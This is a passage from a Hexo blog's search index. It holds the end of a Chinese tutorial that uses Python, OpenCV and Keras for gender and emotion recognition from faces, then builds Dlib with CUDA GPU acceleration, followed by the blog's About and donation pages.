class="number">0</span>: <span class="string">'女'</span>, <span class="number">1</span>: <span class="string">'男'</span>&#125;</span><br><span class="line">color = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (x, y, w, h) <span class="keyword">in</span> faces:</span><br><span class="line">    face = img[(y - <span class="number">60</span>):(y + h + <span class="number">60</span>), (x - <span class="number">30</span>):(x + w + <span class="number">30</span>)]</span><br><span class="line">    face = cv2.resize(face, (<span class="number">48</span>, <span class="number">48</span>))</span><br><span class="line">    face = np.expand_dims(face, <span class="number">0</span>)</span><br><span class="line">    face = face / <span class="number">255.0</span></span><br><span class="line">    gender_label_arg = np.argmax(gender_classifier.predict(face))</span><br><span class="line">    gender = gender_labels[gender_label_arg]</span><br><span class="line">    cv2.rectangle(img, (x, y), (x + h, y + w), color, <span class="number">2</span>)</span><br><span class="line">    img = chineseText.cv2ImgAddText(img, gender, x + h, y, color, <span class="number">30</span>)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">"Image"</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h3 id="5-利用keras实现表情识别"><a href="#5-利用keras实现表情识别" class="headerlink" title="5. 利用keras实现表情识别"></a>5. 利用<strong>keras</strong>实现表情识别</h3><h4 id="实现代码-7"><a href="#实现代码-7" class="headerlink" title="实现代码"></a>实现代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> cv2</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">import</span> chineseText</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">startTime = datetime.datetime.now()</span><br><span class="line">emotion_classifier = load_model(</span><br><span class="line">    <span class="string">'classifier/emotion_models/simple_CNN.530-0.65.hdf5'</span>)</span><br><span class="line">endTime = datetime.datetime.now()</span><br><span class="line">print(endTime - startTime)</span><br><span class="line"></span><br><span class="line">emotion_labels = &#123;</span><br><span class="line">    <span class="number">0</span>: <span class="string">'生气'</span>,</span><br><span class="line">    <span class="number">1</span>: <span class="string">'厌恶'</span>,</span><br><span class="line">    <span class="number">2</span>: <span class="string">'恐惧'</span>,</span><br><span class="line">    <span class="number">3</span>: <span class="string">'开心'</span>,</span><br><span class="line">    <span class="number">4</span>: <span class="string">'难过'</span>,</span><br><span class="line">    <span class="number">5</span>: <span class="string">'惊喜'</span>,</span><br><span class="line">    <span class="number">6</span>: <span class="string">'平静'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">img = cv2.imread(<span class="string">"img/emotion/emotion.png"</span>)</span><br><span class="line">face_classifier = cv2.CascadeClassifier(</span><br><span class="line">    <span class="string">"C:\Python36\Lib\site-packages\opencv-master\data\haarcascades\haarcascade_frontalface_default.xml"</span></span><br><span class="line">)</span><br><span class="line">gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)</span><br><span class="line">faces = face_classifier.detectMultiScale(</span><br><span class="line">    gray, scaleFactor=<span class="number">1.2</span>, minNeighbors=<span class="number">3</span>, minSize=(<span class="number">40</span>, <span class="number">40</span>))</span><br><span class="line">color = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (x, y, w, h) <span class="keyword">in</span> faces:</span><br><span class="line">    gray_face = gray[(y):(y + h), (x):(x + w)]</span><br><span class="line">    gray_face = cv2.resize(gray_face, (<span class="number">48</span>, <span class="number">48</span>))</span><br><span class="line">    gray_face = gray_face / <span class="number">255.0</span></span><br><span class="line">    gray_face = np.expand_dims(gray_face, <span class="number">0</span>)</span><br><span class="line">    gray_face = np.expand_dims(gray_face, <span class="number">-1</span>)</span><br><span class="line">    emotion_label_arg = np.argmax(emotion_classifier.predict(gray_face))</span><br><span class="line">    emotion = emotion_labels[emotion_label_arg]</span><br><span class="line">    cv2.rectangle(img, (x + <span class="number">10</span>, y + <span class="number">10</span>), (x + h - <span class="number">10</span>, y + w - <span class="number">10</span>),</span><br><span class="line">                  (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>), <span class="number">2</span>)</span><br><span class="line">    img = chineseText.cv2ImgAddText(img, emotion, x + h * <span class="number">0.3</span>, y, color, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">cv2.imshow(<span class="string">"Image"</span>, img)</span><br><span class="line">cv2.waitKey(<span class="number">0</span>)</span><br><span class="line">cv2.destroyAllWindows()</span><br></pre></td></tr></table></figure><h2 id="四、利用GPU加速Dlib提高效率"><a href="#四、利用GPU加速Dlib提高效率" class="headerlink" title="四、利用GPU加速Dlib提高效率"></a>四、利用GPU加速Dlib提高效率</h2><blockquote><p>在前面的小实验中我们发现了，使用Dlib来实现的人脸检测与识别速度很慢，在视频中很难实现实时性。<br>所以我们不仅要想，是否可以用GPU加速一下。<br>以前可能很麻烦，现在英伟达推出的CUDA就专门为了解决这个而生。</p></blockquote><h3 id="1-首先下载CUDA"><a href="#1-首先下载CUDA" class="headerlink" title="1. 首先下载CUDA"></a>1. 首先下载<strong>CUDA</strong></h3><p><a href="https://developer.nvidia.com/cuda-downloads" target="_blank" rel="noopener">CUDA下载链接</a></p><p>下载并安装，不必多说，一路下一步</p><h3 id="2-然后下载cudnn"><a href="#2-然后下载cudnn" class="headerlink" title="2. 然后下载cudnn"></a>2. 然后下载<strong>cudnn</strong></h3><p><a href="https://developer.nvidia.com/rdp/cudnn-download" target="_blank" rel="noopener">cudnn下载链接</a></p><p>这里下载需要注册英伟达账号，注册就行，下载下来后解压，里面提供cudnn库文件以及头文件，需要把cudnn目录下的bin、include以及lib目录中的文件拷贝到相应的cuda目录中的bin、include和lib目录中去。</p><h3 id="3-安装cmake"><a href="#3-安装cmake" class="headerlink" title="3. 安装cmake"></a>3. 安装<strong>cmake</strong></h3><p>cmake是要在后面编译Dlib用到的。<br><a href="https://cmake.org/download/" target="_blank" rel="noopener">cmake下载链接</a><br>记住安装并添加path。</p><h3 id="4-编译Dlib"><a href="#4-编译Dlib" class="headerlink" title="4. 编译Dlib"></a>4. 编译Dlib</h3><p>这里我们跳过，因为后面可以直接在安装Dlib库时让他自动编译，能自动搞何必去麻烦，如果感兴趣可以自己去编译。</p><h3 id="5-安装支持CUDA的Dlib库（会自动编译）"><a href="#5-安装支持CUDA的Dlib库（会自动编译）" class="headerlink" title="5. 安装支持CUDA的Dlib库（会自动编译）"></a>5. 安装支持CUDA的Dlib库（会自动编译）</h3><p>我们打开64位的cmd（这一个会在安装VS2017的时候提供），或者打开64位的Powershell，在里面运行安装命令  </p><p><code>python setup.py install --yes DLIB_USE_CUDA</code>  </p><p>这一个命令会自动编译Dlib并且安装，就不用操心了。</p><blockquote><p><strong>在cmake编译的过程中可能会报出各种问题，稍微总结一下：</strong><br>如果出现类似于没找到相应编译器的原因，说明vs安装可能有问题，可能是vs版本比较老，vs安装不正确，或者vs安装不完整。不管怎么说vs的安装时间会需要很长时间，而且由于vs版本的问题，安装新的vs可能会出现各种问题，如果想手动卸载重装就更坑了，这个时候可以用卸载工具进行卸载：<a href="https://github.com/Microsoft/VisualStudioUninstaller/releases,下载之后直接解压然后以运行可执行程序，等待自动清理完成，然后重新安装vs；" target="_blank" rel="noopener">https://github.com/Microsoft/VisualStudioUninstaller/releases,下载之后直接解压然后以运行可执行程序，等待自动清理完成，然后重新安装vs；</a><br>如果出现类似于找不到cuda的问题，请确认是否正确安装cuda；并且，如果提示找到了cuda但没有正确的cudnn，请确认是否正确地把cudnn中的lib、include和bin目录中的文件拷贝到相应的cuda目录底下；<br>在使用cmake编译的时候如果你更改了配置，那么需要在cmake‘中点击file中的delete cache，然后重新configure；<br>有一种很奇葩的现象是，有可能你的机器上已经安装过了cuda和cudnn，并且之前使用cmake configure的时候成功编译完成得到dlib的python库，但是出于某些原因需要重新安装cuda和cudnn，那么不仅需要手动卸载之前的cuda，而且最好也删除site-packages目录中所有和dlib相关的目录和文件，以及cmake输出得到的临时文件，然后重新安装cuda和cudnn，并且按照之前的步骤执行python setup.py install –yes DLIB_USE_CUDA，得到dlib的python库文件。<br>如果编译顺利，并且中间没有报错，可以新建一个python程序，然后import dlib成功，大功告成。</p></blockquote><h3 id="6-验证新编译好的Dlib是否支持CUDA"><a href="#6-验证新编译好的Dlib是否支持CUDA" class="headerlink" title="6. 验证新编译好的Dlib是否支持CUDA"></a>6. 验证新编译好的Dlib是否支持CUDA</h3><p><strong>python脚本运行</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dlib</span><br><span class="line">print(dlib.__)</span><br><span class="line">print(dlib.DLIB_USE_CUDA)</span><br><span class="line">print(dlib.cuda.get_num_devices())</span><br></pre></td></tr></table></figure><h2 id="人脸检测和识别学习就告一段落了，感谢观看"><a href="#人脸检测和识别学习就告一段落了，感谢观看" class="headerlink" title="人脸检测和识别学习就告一段落了，感谢观看"></a>人脸检测和识别学习就告一段落了，感谢观看</h2>]]></content>
      
      
      <categories>
          
          <category> coding </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> AI </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>About</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[<h3 id="About-Me"><a href="#About-Me" class="headerlink" title="About Me"></a>About Me</h3><p>Hi, I’m zu1k.</p><p>I’m a student, now busy with the postgraduate entrance examination.</p><p>I was born and live in a small village surrounded by sea. I think the world is so big, and I want to see the it.</p><p>As for programming, I have learned java、python、golang and some javascript, I like to write backend in golang and frontend in vue.</p><h3 id="About-this-blog"><a href="#About-this-blog" class="headerlink" title="About this blog"></a>About this blog</h3><p>This blog is used to record my life and learning.</p><p>It is powered by <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> and the theme is <a href="https://github.com/probberechts/hexo-theme-cactus" target="_blank" rel="noopener">Cactus</a>, thanks to their developers.</p><p>You can find articles by <a href="/categories/">categories</a> and <a href="/tags/">tags</a>, <a href="/search/">searching</a> is also a good choice.<br>You can subscribe my blog by <a href="/atom.xml">RSS</a>.</p><p>For search engine crawlers, <a href="/sitemap.xml">sitemap</a> or <a href="/baidusitemap.xml">Baidu sitemap</a>.</p><p>You can click <a href="/donate/">here</a> to reward or donate to me.</p>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>donate</title>
      <link href="/donate/index.html"/>
      <url>/donate/index.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>打赏与捐赠只是一种形式，任何有意义的信息、评论、邮件或反馈我很乐于收到</p></blockquote><h2 id="你可以通过以下渠道进行打赏或捐赠"><a href="#你可以通过以下渠道进行打赏或捐赠" class="headerlink" title="你可以通过以下渠道进行打赏或捐赠"></a>你可以通过以下渠道进行打赏或捐赠</h2><h3 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/donate/img/alipay.jpg" loading="lazy" width="200" height="200" /><h3 id="微信"><a href="#微信" class="headerlink" title="微信"></a>微信</h3><img src="https://cdn.jsdelivr.net/gh/zu1k/hexoblog@201121141/donate/img/wechat.png" loading="lazy" width="200" height="200" /><blockquote><p>感谢各位进行捐赠的朋友</p></blockquote>]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Links</title>
      <link href="/links/index.html"/>
      <url>/links/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Search</title>
      <link href="/search/index.html"/>
      <url>/search/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>Tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
